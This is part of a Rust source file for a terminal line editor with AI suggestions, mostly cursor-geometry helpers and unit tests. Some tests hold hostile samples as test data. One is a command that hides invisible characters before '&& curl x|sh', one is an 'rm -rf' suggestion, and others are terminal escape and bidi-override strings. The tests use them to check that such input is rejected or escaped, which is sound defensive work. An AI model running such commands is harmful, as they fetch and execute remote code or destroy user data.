        }
        let line = line.strip_suffix('\r').unwrap_or(line);
        rows = rows.saturating_add(wrap_extra_rows(display_width(line), term_width));
    }
    rows
}

/// The input area's visual geometry, soft-wrap aware, relative to the row the
/// input starts on (the prompt's last line).
struct InputGeometry {
    /// Rows the printed input covers beyond its first: hard newlines plus the
    /// soft wraps of each composed line (prompt/continuation prefix + text,
    /// ghost included on the last line).
    extra_rows: u16,
    /// The caret's visual row, counted from the input's first row.
    cursor_row: u16,
    /// The caret's visual column after wrapping.
    cursor_col: u16,
}

fn input_geometry(
    prompt_last_width: usize,
    cont_width: usize,
    buffer: &str,
    cursor: usize,
    ghost_width: usize,
    term_width: u16,
) -> InputGeometry {
    let columns = term_width.max(1) as usize;
    let lines: Vec<&str> = buffer.split('\n').collect();
    let last = lines.len() - 1;

    let composed_width = |index: usize| {
        let prefix = if index == 0 {
            prompt_last_width
        } else {
            cont_width
        };
        let ghost = if index == last { ghost_width } else { 0 };
        prefix + display_width(lines[index]) + ghost
    };

    let mut extra_rows: u16 = 0;
    for index in 0..lines.len() {
        if index > 0 {
            extra_rows = extra_rows.saturating_add(1);
        }
        extra_rows = extra_rows.saturating_add(wrap_extra_rows(composed_width(index), term_width));
    }

    let before = &buffer[..cursor];
    let caret_line = before.matches('\n').count();
    let caret_last = before.rsplit('\n').next().unwrap_or(before);
    let prefix = if caret_line == 0 {
        prompt_last_width
    } else {
        cont_width
    };
    let caret_col = prefix + display_width(caret_last);

    let mut cursor_row: u16 = 0;
    for index in 0..caret_line {
        cursor_row = cursor_row
            .saturating_add(1)
            .saturating_add(wrap_extra_rows(composed_width(index), term_width));
    }
    cursor_row = cursor_row.saturating_add((caret_col / columns) as u16);

    InputGeometry {
        extra_rows,
        cursor_row,
        cursor_col: (caret_col % columns) as u16,
    }
}

fn display_width_raw(s: &str) -> usize {
    s.chars().map(char_width).sum()
}

/// Find the byte offset of the next word boundary in a suggestion string.
/// Word boundaries are spaces, tabs, or '/'. Includes trailing separator.
fn find_next_word_boundary(s: &str) -> usize {
    let bytes = s.as_bytes();
    let mut i = 0;
    // Skip leading separators
    while i < bytes.len() && (bytes[i] == b' ' || bytes[i] == b'\t' || bytes[i] == b'/') {
        i += 1;
    }
    // Skip word characters until next separator
    while i < bytes.len() && bytes[i] != b' ' && bytes[i] != b'\t' && bytes[i] != b'/' {
        i += 1;
    }
    // Include trailing separator (so "push " gives "push ", not "push")
    if i < bytes.len() && (bytes[i] == b' ' || bytes[i] == b'/') {
        i += 1;
    }
    if i == 0 {
        s.len()
    } else {
        i
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_workflow(
        command: &str,
        parameters: Vec<workflows::WorkflowParam>,
    ) -> workflows::Workflow {
        workflows::Workflow {
            name: "test-workflow".into(),
            description: "exercise workflow editing".into(),
            command: command.into(),
            parameters,
            tags: Vec::new(),
        }
    }

    fn workflow_mode_with(
        workflow: workflows::Workflow,
        buffer: &str,
        cursor: usize,
        suggestion: Option<&str>,
    ) -> WorkflowMode {
        WorkflowMode {
            query: String::new(),
            results: vec![workflow],
            selected: 0,
            original_input: WorkflowInputSnapshot {
                buffer: buffer.into(),
                cursor,
                suggestion: suggestion.map(str::to_string),
            },
            session: None,
            suggestion_selected: None,
        }
    }

    fn menu_of(texts: &[&str], word: &str) -> CompletionMenu {
        CompletionMenu {
            completions: texts
                .iter()
                .map(|text| Completion {
                    text: (*text).to_string(),
                    display: (*text).to_string(),
                    description: None,
                    kind: CompletionKind::Subcommand,
                    is_dir: false,
                })
                .collect(),
            selected: 0,
            word_start: 4,
            original_word: word.to_string(),
        }
    }

    #[test]
    fn workflow_search_scroll_always_keeps_the_selection_visible() {
        assert_eq!(centered_scroll_offset(0, 20, 5), 0);
        assert_eq!(centered_scroll_offset(9, 20, 5), 7);
        assert_eq!(centered_scroll_offset(19, 20, 5), 15);
        assert_eq!(centered_scroll_offset(99, 20, 5), 15);
        assert_eq!(centered_scroll_offset(0, 0, 0), 0);
    }

    #[test]
    fn parameterless_workflow_only_inserts_its_command() {
        let mut editor = Editor::new();
        editor.buffer = "keep me".into();
        editor.cursor = editor.buffer.len();
        editor.workflow_mode = Some(workflow_mode_with(
            test_workflow("git status", Vec::new()),
            &editor.buffer,
            editor.cursor,
            None,
        ));
        let state = ShellState::new(false);

        let action = editor
            .handle_workflow_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE), &state)
            .unwrap();

        assert!(
            matches!(action, KeyAction::Continue),
            "selection never submits"
        );
        assert_eq!(editor.buffer, "git status");
        assert_eq!(editor.cursor, editor.buffer.len());
        assert!(editor.workflow_mode.is_none());
    }

    #[test]
    fn workflow_parameters_edit_traverse_suggestions_and_finish_in_the_buffer() {
        let parameter = workflows::WorkflowParam {
            name: "target".into(),
            description: Some("where to deploy".into()),
            default: None,
            suggestions: vec!["staging".into(), "production".into()],
        };
        let mut editor = Editor::new();
        editor.buffer = "original".into();
        editor.cursor = editor.buffer.len();
        editor.workflow_mode = Some(workflow_mode_with(
            test_workflow("deploy {{target}}", vec![parameter]),
            &editor.buffer,
            editor.cursor,
            None,
        ));
        let state = ShellState::new(false);

        editor
            .handle_workflow_search_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE), &state);
        assert_eq!(
            editor.buffer, "original",
            "filling does not mutate the line"
        );
        assert!(editor
            .workflow_mode
            .as_ref()
            .and_then(|mode| mode.session.as_ref())
            .is_some());

        editor.handle_workflow_parameter_key(KeyEvent::new(KeyCode::Char('x'), KeyModifiers::NONE));
        assert_eq!(
            editor
                .workflow_mode
                .as_ref()
                .unwrap()
                .session
                .as_ref()
                .unwrap()
                .current_value(),
            Some("x")
        );
        editor.handle_workflow_parameter_key(KeyEvent::new(KeyCode::Tab, KeyModifiers::NONE));
        assert_eq!(
            editor
                .workflow_mode
                .as_ref()
                .unwrap()
                .session
                .as_ref()
                .unwrap()
                .current_value(),
            Some("staging")
        );
        editor.handle_workflow_parameter_key(KeyEvent::new(KeyCode::Down, KeyModifiers::NONE));
        editor.handle_workflow_parameter_key(KeyEvent::new(KeyCode::Up, KeyModifiers::NONE));
        assert_eq!(
            editor
                .workflow_mode
                .as_ref()
                .unwrap()
                .session
                .as_ref()
                .unwrap()
                .current_value(),
            Some("staging")
        );
        editor.handle_workflow_parameter_key(KeyEvent::new(KeyCode::Backspace, KeyModifiers::NONE));
        editor
            .handle_workflow_parameter_key(KeyEvent::new(KeyCode::Char('!'), KeyModifiers::SHIFT));
        editor.handle_workflow_parameter_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));

        assert_eq!(editor.buffer, "deploy stagin!");
        assert_eq!(editor.cursor, editor.buffer.len());
        assert!(editor.workflow_mode.is_none());
    }

    #[test]
    fn workflow_completion_failure_keeps_the_last_parameter_editable() {
        let parameter = workflows::WorkflowParam {
            name: "value".into(),
            description: None,
            default: None,
            suggestions: Vec::new(),
        };
        let mut editor = Editor::new();
        editor.buffer = "original".into();
        editor.cursor = editor.buffer.len();
        editor.workflow_mode = Some(workflow_mode_with(
            test_workflow(&"{{value}}".repeat(7_000), vec![parameter]),
            &editor.buffer,
            editor.cursor,
            None,
        ));
        let state = ShellState::new(false);
        editor
            .handle_workflow_search_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE), &state);
        editor.handle_workflow_paste(&"x".repeat(200), &state);

        editor.handle_workflow_parameter_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));

        let session = editor
            .workflow_mode
            .as_ref()
            .and_then(|mode| mode.session.as_ref())
            .expect("failed render keeps the workflow session open");
        assert_eq!(session.current_index(), 0);
        assert_eq!(session.current_value().unwrap().len(), 200);
        assert!(editor.ai_error.is_some());

        editor.handle_workflow_parameter_key(KeyEvent::new(KeyCode::Backspace, KeyModifiers::NONE));
        assert_eq!(
            editor
                .workflow_mode
                .as_ref()
                .unwrap()
                .session
                .as_ref()
                .unwrap()
                .current_value()
                .unwrap()
                .len(),
            199
        );
    }

    #[test]
    fn workflow_modal_preserves_interrupt_and_eof_actions() {
        let mut editor = Editor::new();
        editor.buffer = "echo keep".into();
        editor.cursor = editor.buffer.len();
        editor.workflow_mode = Some(workflow_mode_with(
            test_workflow("git status", Vec::new()),
            &editor.buffer,
            editor.cursor,
            None,
        ));
        let state = ShellState::new(false);

        let action = editor
            .handle_workflow_key(
                KeyEvent::new(KeyCode::Char('c'), KeyModifiers::CONTROL),
                &state,
            )
            .unwrap();
        assert!(matches!(action, KeyAction::Interrupt));
        assert_eq!(editor.buffer, "echo keep");
        assert!(editor.workflow_mode.is_none());

        editor.workflow_mode = Some(workflow_mode_with(
            test_workflow("git status", Vec::new()),
            &editor.buffer,
            editor.cursor,
            None,
        ));
        let action = editor
            .handle_workflow_key(
                KeyEvent::new(KeyCode::Char('d'), KeyModifiers::CONTROL),
                &state,
            )
            .unwrap();
        assert!(matches!(action, KeyAction::Eof));
        assert_eq!(editor.buffer, "echo keep");
        assert!(editor.workflow_mode.is_none());
    }

    #[test]
    fn workflow_search_query_budget_includes_the_full_header() {
        let progress = "[4096/4096] ";
        let marker = "❯ ";
        let width = 32;
        let remaining = panel_remaining_width(width, &[" WORKFLOWS ", progress, marker]);
        let (query, query_width) = history_panel_text(&"雪".repeat(100), remaining);

        assert!(
            display_width(" WORKFLOWS ")
                + display_width(progress)
                + display_width(marker)
                + query_width
                <= width as usize
        );
        assert!(query.ends_with('…'));
    }

    #[test]
    fn escape_from_parameter_filling_restores_the_exact_input_snapshot() {
        let parameter = workflows::WorkflowParam {
            name: "value".into(),
            description: None,
            default: Some("default".into()),
            suggestions: Vec::new(),
        };
        let mut editor = Editor::new();
        editor.buffer = "echo keep".into();
        editor.cursor = 4;
        editor.suggestion = Some(" this ghost".into());
        editor.workflow_mode = Some(workflow_mode_with(
            test_workflow("echo {{value}}", vec![parameter]),
            &editor.buffer,
            editor.cursor,
            editor.suggestion.as_deref(),
        ));
        let state = ShellState::new(false);
        editor
            .handle_workflow_search_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE), &state);
        editor.handle_workflow_parameter_key(KeyEvent::new(KeyCode::Char('x'), KeyModifiers::NONE));

        editor
            .handle_workflow_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE), &state)
            .unwrap();

        assert_eq!(editor.buffer, "echo keep");
        assert_eq!(editor.cursor, 4);
        assert_eq!(editor.suggestion.as_deref(), Some(" this ghost"));
        assert!(editor.workflow_mode.is_none());
    }

    #[test]
    fn post_key_suggestion_refresh_is_skipped_after_workflow_escape() {
        let mut editor = Editor::new();
        editor.buffer = "echo keep".into();
        editor.cursor = editor.buffer.len();
        editor.suggestion = Some(" --ai-only-ghost".into());
        editor.workflow_mode = Some(workflow_mode_with(
            test_workflow("git status", Vec::new()),
            &editor.buffer,
            editor.cursor,
            editor.suggestion.as_deref(),
        ));
        let state = ShellState::new(false);
        let history = History::new(10);
        let cancelling_workflow = editor.workflow_mode.is_some();

        editor
            .handle_workflow_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE), &state)
            .unwrap();
        if !cancelling_workflow {
            editor.update_suggestion(&history, &state);
        }

        assert_eq!(editor.buffer, "echo keep");
        assert_eq!(editor.suggestion.as_deref(), Some(" --ai-only-ghost"));
    }

    #[test]
    fn typing_narrows_the_open_menu_instead_of_closing_it() {
        let mut editor = Editor::new();
        editor.buffer = "git checkout".to_string();
        editor.cursor = editor.buffer.len();
        editor.completion_menu = Some(menu_of(&["checkout", "cherry-pick", "commit"], "c"));

        // `h` narrows to the two candidates containing it after the `c`.
        editor.narrow_completion_menu(KeyCode::Char('h'));
        let menu = editor.completion_menu.as_ref().expect("menu stays open");
        assert_eq!(menu.original_word, "ch");
        assert_eq!(menu.completions.len(), 2);
        assert_eq!(menu.selected, 0);
        // The line shows what accepting the first survivor would give.
        assert_eq!(editor.buffer, "git checkout");

        // Backspace widens it again.
        editor.narrow_completion_menu(KeyCode::Backspace);
        let menu = editor.completion_menu.as_ref().unwrap();
        assert_eq!(menu.original_word, "c");
        assert_eq!(menu.completions.len(), 2, "narrowing does not restore");
    }

    #[test]
    fn narrowing_past_every_candidate_closes_the_menu_and_keeps_the_word() {
        let mut editor = Editor::new();
        editor.buffer = "git che".to_string();
        editor.cursor = editor.buffer.len();
        editor.completion_menu = Some(menu_of(&["checkout", "cherry-pick"], "che"));

        // A character no candidate has: the word has moved past the list.
        editor.narrow_completion_menu(KeyCode::Char('z'));
        assert!(editor.completion_menu.is_none(), "the menu closes");
        assert_eq!(editor.buffer, "git chez", "the typed word stays");
        assert_eq!(editor.cursor, editor.buffer.len());
    }

    #[test]
    fn backspacing_an_empty_word_closes_the_menu() {
        let mut editor = Editor::new();
        editor.buffer = "git ".to_string();
        editor.cursor = editor.buffer.len();
        editor.completion_menu = Some(menu_of(&["add", "commit"], ""));

        editor.narrow_completion_menu(KeyCode::Backspace);
        assert!(editor.completion_menu.is_none());
    }

    #[test]
    fn a_ghost_suggestion_can_be_taken_one_word_at_a_time() {
        let mut editor = Editor::new();
        editor.buffer = "git push".to_string();
        editor.cursor = editor.buffer.len();
        editor.suggestion = Some(" origin main".to_string());

        editor.accept_suggestion_word();
        assert_eq!(editor.buffer, "git push origin");
        assert_eq!(editor.cursor, editor.buffer.len());
        assert_eq!(editor.suggestion.as_deref(), Some(" main"));

        editor.accept_suggestion_word();
        assert_eq!(editor.buffer, "git push origin main");
        assert_eq!(editor.suggestion, None, "nothing is left to take");

        // Taking from nothing is harmless.
        editor.accept_suggestion_word();
        assert_eq!(editor.buffer, "git push origin main");
    }

    #[test]
    fn taking_a_ghost_path_arrives_one_directory_at_a_time() {
        let mut editor = Editor::new();
        editor.buffer = "cd /home".to_string();
        editor.cursor = editor.buffer.len();
        editor.suggestion = Some("/user/projects/jsh".to_string());

        editor.accept_suggestion_word();
        assert_eq!(editor.buffer, "cd /home/user");
        assert_eq!(editor.suggestion.as_deref(), Some("/projects/jsh"));

        editor.accept_suggestion_word();
        assert_eq!(editor.buffer, "cd /home/user/projects");
    }

    #[test]
    fn menu_selection_wraps_and_rewrites_the_word_in_both_directions() {
        let mut editor = Editor::new();
        editor.buffer = "git pu".to_string();
        editor.cursor = editor.buffer.len();
        let completions = ["push", "pull"]
            .iter()
            .map(|text| Completion {
                text: (*text).to_string(),
                display: (*text).to_string(),
                description: None,
                kind: CompletionKind::Subcommand,
                is_dir: false,
            })
            .collect::<Vec<_>>();
        editor.completion_menu = Some(CompletionMenu {
            completions,
            selected: 0,
            word_start: 4,
            original_word: "pu".to_string(),
        });

        editor.step_completion_menu(1);
        assert_eq!(editor.buffer, "git pull");
        assert_eq!(editor.cursor, editor.buffer.len());

        // Forward from the last entry wraps to the first.
        editor.step_completion_menu(1);
        assert_eq!(editor.buffer, "git push");

        // Backwards from the first wraps to the last, which is what makes
        // Shift-Tab and Up usable on the very first candidate.
        editor.step_completion_menu(-1);
        assert_eq!(editor.buffer, "git pull");
        assert_eq!(editor.completion_menu.as_ref().unwrap().selected, 1);
    }

    #[test]
    fn stepping_an_absent_or_empty_menu_is_harmless() {
        let mut editor = Editor::new();
        editor.buffer = "ls".to_string();
        editor.cursor = 2;
        editor.step_completion_menu(1);
        assert_eq!(editor.buffer, "ls");

        editor.completion_menu = Some(CompletionMenu {
            completions: Vec::new(),
            selected: 0,
            word_start: 0,
            original_word: String::new(),
        });
        editor.step_completion_menu(-1);
        assert_eq!(editor.buffer, "ls");
    }

    #[test]
    fn comments_are_not_ai_prompts_without_an_enabled_worker() {
        let mut editor = Editor::new();
        editor.ai_worker = None;
        editor.buffer = "# keep this as a comment".to_string();

        assert_eq!(editor.ai_generation_prompt(), None);
        assert_eq!(editor.buffer, "# keep this as a comment");
    }

    #[test]
    fn ai_errors_restore_the_input_and_expose_a_safe_status() {
        let mut editor = Editor::new();
        editor.ai_worker = None;
        editor.buffer = "# list project files".to_string();
        editor.cursor = editor.buffer.len();
        editor.suggestion = Some(" previous suggestion".to_string());
        editor.snapshot_ai_input();
        editor.buffer = "[AI...]".to_string();
        editor.cursor = editor.buffer.len();
        editor.active_ai_request = Some(ActiveAiRequest {
            request_id: 4,
            kind: AiRequestKind::Generate,
        });

        assert!(editor.apply_ai_response(AiResponse::Error {
            request_id: 4,
            message: "\x1b[31mservice unavailable\x1b[0m\ntry again\u{202e}\u{200b}".to_string(),
        }));

        assert_eq!(editor.buffer, "# list project files");
        assert_eq!(editor.cursor, editor.buffer.len());
        assert_eq!(editor.suggestion.as_deref(), Some(" previous suggestion"));
        assert_eq!(
            editor.ai_error.as_deref(),
            Some("AI error: service unavailable try again\\u{202e}\\u{200b}")
        );
        assert!(editor.active_ai_request.is_none());
    }

    #[test]
    fn explanations_are_read_only_and_never_become_suggestions() {
        let mut editor = Editor::new();
        editor.ai_worker = None;
        editor.buffer = "git status --short".to_string();
        editor.cursor = editor.buffer.len();
        editor.suggestion = Some(" --branch".to_string());
        editor.active_ai_request = Some(ActiveAiRequest {
            request_id: 8,
            kind: AiRequestKind::Explain,
        });

        assert!(editor.apply_ai_response(AiResponse::Explanation {
            request_id: 8,
            explanation: "git status inspects the work tree\n--short selects compact output"
                .to_string(),
        }));

        assert_eq!(editor.buffer, "git status --short");
        assert_eq!(editor.cursor, editor.buffer.len());
        assert_eq!(editor.suggestion.as_deref(), Some(" --branch"));
        assert_eq!(
            editor.ai_explanation.as_deref(),
            Some("git status inspects the work tree\n--short selects compact output")
        );

        // Even a response constructed with the wrong variant but the right ID
        // cannot route an Explain operation into executable state.
        editor.active_ai_request = Some(ActiveAiRequest {
            request_id: 9,
            kind: AiRequestKind::Explain,
        });
        assert!(editor.apply_ai_response(AiResponse::Suggestion {
            request_id: 9,
            command: "rm -rf important".to_string(),
        }));
        assert_eq!(editor.buffer, "git status --short");
        assert_eq!(editor.suggestion.as_deref(), Some(" --branch"));
        assert_eq!(
            editor.ai_error.as_deref(),
            Some("AI error: mismatched response type")
        );
    }

    #[test]
    fn stale_ai_responses_are_ignored_without_disturbing_the_active_request() {
        let mut editor = Editor::new();
        editor.ai_worker = None;
        editor.buffer = "[AI...]".to_string();
        editor.cursor = editor.buffer.len();
        editor.active_ai_request = Some(ActiveAiRequest {
            request_id: 12,
            kind: AiRequestKind::Generate,
        });

        assert!(!editor.apply_ai_response(AiResponse::Suggestion {
            request_id: 11,
            command: "echo stale".to_string(),
        }));
        assert_eq!(editor.buffer, "[AI...]");
        assert_eq!(editor.suggestion, None);
        assert_eq!(
            editor.active_ai_request,
            Some(ActiveAiRequest {
                request_id: 12,
                kind: AiRequestKind::Generate,
            })
        );

        assert!(!editor.apply_ai_response(AiResponse::Error {
            request_id: 10,
            message: "stale failure".to_string(),
        }));
        assert_eq!(editor.ai_error, None);
    }

    #[test]
    fn editing_cancels_ai_and_restores_input_before_the_keystroke() {
        let mut editor = Editor::new();
        editor.ai_worker = None;
        editor.buffer = "# list project files".to_string();
        editor.cursor = editor.buffer.len();
        editor.snapshot_ai_input();
        editor.buffer = "[AI...]".to_string();
        editor.cursor = editor.buffer.len();
        editor.active_ai_request = Some(ActiveAiRequest {
            request_id: 21,
            kind: AiRequestKind::Generate,
        });

        assert_eq!(
            editor.cancel_ai_for_user_input(),
            Some(AiRequestKind::Generate)
        );
        editor.buffer.insert(editor.cursor, '!');
        editor.cursor += 1;

        assert_eq!(editor.buffer, "# list project files!");
        assert_eq!(editor.cursor, editor.buffer.len());
        assert!(editor.active_ai_request.is_none());
        assert!(editor.ai_saved_input.is_none());
        assert!(!editor.apply_ai_response(AiResponse::Suggestion {
            request_id: 21,
            command: "echo stale".to_string(),
        }));
        assert_eq!(editor.buffer, "# list project files!");
    }

    #[test]
    fn editing_during_explanation_invalidates_it_without_changing_the_line() {
        let mut editor = Editor::new();
        editor.ai_worker = None;
        editor.buffer = "git status".to_string();
        editor.cursor = editor.buffer.len();
        editor.active_ai_request = Some(ActiveAiRequest {
            request_id: 22,
            kind: AiRequestKind::Explain,
        });

        assert_eq!(
            editor.cancel_ai_for_user_input(),
            Some(AiRequestKind::Explain)
        );
        editor.buffer.push_str(" --short");
        editor.cursor = editor.buffer.len();

        assert_eq!(editor.buffer, "git status --short");
        assert!(editor.active_ai_request.is_none());
        assert!(!editor.apply_ai_response(AiResponse::Explanation {
            request_id: 22,
            explanation: "stale explanation".to_string(),
        }));
        assert_eq!(editor.ai_explanation, None);
    }

    #[test]
    fn execution_output_replaces_exit_code_fallback_when_context_is_allowed() {
        let fallback = Some(("cargo test".to_string(), "exit code 101".to_string(), 101));
        let enriched = last_error_with_execution_output(fallback, Some("jsh-1"), true, |id| {
            assert_eq!(id, "jsh-1");
            Some("error[E0425]: missing value\n".to_string())
        });

        assert_eq!(
            enriched,
            Some((
                "cargo test".to_string(),
                "error[E0425]: missing value\n".to_string(),
                101,
            ))
        );
    }

    #[test]
    fn private_ai_context_never_loads_execution_output() {
        let fallback = Some(("false".to_string(), "exit code 1".to_string(), 1));
        let mut loaded = false;
        let result =
            last_error_with_execution_output(fallback.clone(), Some("jsh-1"), false, |_| {
                loaded = true;
                Some("private terminal output".to_string())
            });

        assert_eq!(result, fallback);
        assert!(!loaded);
    }

    #[test]
    fn missing_or_empty_execution_output_keeps_exit_code_fallback() {
        let fallback = Some(("false".to_string(), "exit code 1".to_string(), 1));

        assert_eq!(
            last_error_with_execution_output(fallback.clone(), Some("jsh-1"), true, |_| None),
            fallback
        );
        assert_eq!(
            last_error_with_execution_output(fallback.clone(), Some("jsh-1"), true, |_| Some(
                String::new()
            ),),
            fallback
        );
        assert_eq!(
            last_error_with_execution_output(fallback.clone(), None, true, |_| {
                panic!("no execution ID must not invoke the journal loader")
            }),
            fallback
        );
    }

    #[test]
    fn ai_execution_output_cap_preserves_utf8_head_and_tail_with_marker() {
        let output = format!("HEAD:{}:TAIL", "雪".repeat(MAX_AI_EXECUTION_OUTPUT_BYTES));
        let bounded = bounded_ai_execution_output(output);

        assert!(bounded.len() <= MAX_AI_EXECUTION_OUTPUT_BYTES);
        assert!(bounded.starts_with("HEAD:"));
        assert!(bounded.ends_with(":TAIL"));
        assert!(bounded.contains(AI_OUTPUT_TRUNCATION_MARKER));
    }

    #[test]
    fn ai_execution_output_at_limit_remains_exact() {
        let output = "x".repeat(MAX_AI_EXECUTION_OUTPUT_BYTES);

        assert_eq!(bounded_ai_execution_output(output.clone()), output);
    }

    #[test]
    fn history_panel_escapes_controls_bidi_and_multiline_without_utf8_slicing() {
        let hostile = "雪\x1b\u{202e}\nend";
        let (display, width) = history_panel_text(hostile, 80);

        assert_eq!(display, "雪\\x1b\\u{202e}\\nend");
        assert_eq!(width, display_width_raw(&display));
        assert!(!display.contains('\x1b'));
        assert!(!display.contains('\u{202e}'));
        assert!(!display.contains('\n'));

        let (truncated, truncated_width) = history_panel_text("雪雪雪", 3);
        assert_eq!(truncated, "雪…");
        assert_eq!(truncated_width, 3);

        let (fragments, _) = history_panel_fragments("a\u{202e}", &[1], 40);
        assert_eq!(fragments[1], ("\\u{202e}".to_string(), true));
    }

    // --- soft-wrap row accounting ------------------------------------------
    //
    // The repaint moves the cursor up by these counts; counting hard newlines
    // alone made every keystroke leave one stale copy of a wrapped prompt
    // line behind (seen live at 28 columns, where the two-line prompt's info
    // line wraps).

    #[test]
    fn wrapped_lines_count_their_extra_rows() {
        assert_eq!(wrap_extra_rows(0, 28), 0);
        assert_eq!(wrap_extra_rows(27, 28), 0);
        assert_eq!(
            wrap_extra_rows(28, 28),
            0,
            "an exactly-full line keeps its wrap pending"
        );
        assert_eq!(wrap_extra_rows(29, 28), 1);
        assert_eq!(wrap_extra_rows(57, 28), 2);
        assert_eq!(
            wrap_extra_rows(5, 0),
            4,
            "a zero-width terminal is treated as one column, not a division by zero"
        );
    }

    #[test]
    fn rows_consumed_counts_newlines_and_wraps_not_ansi() {
        assert_eq!(rows_consumed("short", 28), 0);
        assert_eq!(rows_consumed("a\r\nb", 28), 1);
        // A 40-column info line on a 28-column terminal takes a second row.
        let wrapped = format!("{}\r\n> ", "x".repeat(40));
        assert_eq!(rows_consumed(&wrapped, 28), 2);
        // Colour codes are painted zero-wide.
        let coloured = format!("\x1b[38;5;11m{}\x1b[0m", "x".repeat(20));
        assert_eq!(rows_consumed(&coloured, 28), 0);
    }

    #[test]
    fn input_geometry_follows_the_caret_across_wraps() {
        // "❯ " (2 cols) plus 30 typed columns on 28: the line wraps once and
        // the caret ends on the second row.
        let buffer = "y".repeat(30);
        let geometry = input_geometry(2, 2, &buffer, buffer.len(), 0, 28);
        assert_eq!(geometry.extra_rows, 1);
        assert_eq!(geometry.cursor_row, 1);
        assert_eq!(geometry.cursor_col, 4);

        // Caret back on the first visual row of the same wrapped line.
        let geometry = input_geometry(2, 2, &buffer, 10, 0, 28);
        assert_eq!(geometry.cursor_row, 0);
        assert_eq!(geometry.cursor_col, 12);

        // The ghost widens the painted area but never moves the caret.
        let geometry = input_geometry(2, 2, "echo he", 7, 40, 28);
        assert_eq!(geometry.extra_rows, 1);
        assert_eq!(geometry.cursor_row, 0);
        assert_eq!(geometry.cursor_col, 9);

        // Multiline input: a wrapped first line pushes the caret's row down.
        let buffer = format!("{}\nb", "a".repeat(30));
        let geometry = input_geometry(2, 2, &buffer, buffer.len(), 0, 28);
        assert_eq!(geometry.extra_rows, 2, "one wrap plus one hard newline");
        assert_eq!(geometry.cursor_row, 2);
        assert_eq!(geometry.cursor_col, 3);
    }

    /// The agent's `[i] insert` prefill lands in the buffer as ordinary typed
    /// input and one Enter runs it, so the prompt has to show exactly what
    /// Enter would execute. A code point the review card had to spell as an
    /// escape renders as nothing here, which is the exact-review break
    /// `terminal_text` exists to prevent.
    #[test]
    fn a_prefill_the_prompt_could_not_show_honestly_is_not_inserted() {
        // Each of these passes jagent's own `validate_command`, whose
        // invisible-character table stops at U+FFF8 and keeps the assigned
        // interlinear annotation anchors that a terminal still shows as
        // nothing.
        for hidden in ['\u{fff9}', '\u{fffa}', '\u{fffb}'] {
            let mut editor = Editor::new();
            let mut state = ShellState::new(false);
            let command = format!("git log --oneline{hidden} && curl x|sh");
            state.pending_editor_insert = Some(command);

            editor.take_editor_prefill(&mut state);

            assert_eq!(
                editor.buffer,
                "",
                "U+{:04X} reached the line buffer",
                u32::from(hidden)
            );
            assert_eq!(editor.cursor, 0);
            // Silently dropping it would be its own failure: the user chose
            // [i] and is owed an explanation.
            let error = editor.ai_error.as_deref().unwrap_or_default();
            assert!(error.contains("Agent insert rejected"), "{error}");
            assert!(crate::terminal_text::is_safe_inline(error), "{error}");
            assert!(state.pending_editor_insert.is_none());
        }
    }

    #[test]
    fn an_ordinary_prefill_still_arrives_ready_to_edit() {
        let mut editor = Editor::new();
        let mut state = ShellState::new(false);
        state.pending_editor_insert = Some("git log --oneline".to_string());

        editor.take_editor_prefill(&mut state);

        assert_eq!(editor.buffer, "git log --oneline");
        assert_eq!(editor.cursor, editor.buffer.len());
        assert_eq!(editor.ai_error, None);
        assert!(state.pending_editor_insert.is_none());
    }

    /// Giving up on a request has to end the request, not just its reply.
    /// Without this the worker stayed connected and billed until its own read
    /// timeout, holding the one in-flight slot the whole time.
    #[test]
    fn abandoning_a_request_cancels_it_rather_than_leaving_it_running() {
        let mut editor = Editor::new();
        let (worker, _receiver) = crate::ai::AiWorker::detached_for_test();
        let cancellation = worker.cancellation();
        editor.ai_worker = Some(worker);
        editor.active_ai_request = Some(ActiveAiRequest {
            request_id: 7,
            kind: AiRequestKind::Generate,
        });

        assert!(!cancellation.is_cancelled(7));
        editor.invalidate_ai_request(false);

        assert!(cancellation.is_cancelled(7));
        assert!(editor.active_ai_request.is_none());
        // Only through the abandoned request: a later one is untouched.
        assert!(!cancellation.is_cancelled(8));
    }

    /// A trigger that cannot be submitted has to say so. Silently returning
    /// false is how the third AI keypress inside a stalled request's window
    /// came to do nothing at all with nothing shown.
    #[test]
    fn a_refused_ai_trigger_reports_why_instead_of_doing_nothing() {
        let mut editor = Editor::new();
        let state = ShellState::new(false);
        let history = History::new(16);
        let (worker, receiver) = crate::ai::AiWorker::detached_for_test();
        editor.ai_worker = Some(worker);

        // The single in-flight slot is already taken and nothing is draining it.
        assert!(editor.trigger_ai_explain(&state, &history));
        editor.buffer = "ls -la".to_string();
        assert!(!editor.trigger_ai_explain(&state, &history));
        let error = editor.ai_error.as_deref().unwrap_or_default();
        assert!(error.contains("still stopping"), "{error}");

        // A worker whose thread is gone is a different problem, and reads as one.
        drop(receiver);
        editor.ai_error = None;
        assert!(!editor.trigger_ai_explain(&state, &history));
        let error = editor.ai_error.as_deref().unwrap_or_default();
        assert!(error.contains("not running"), "{error}");
    }
}
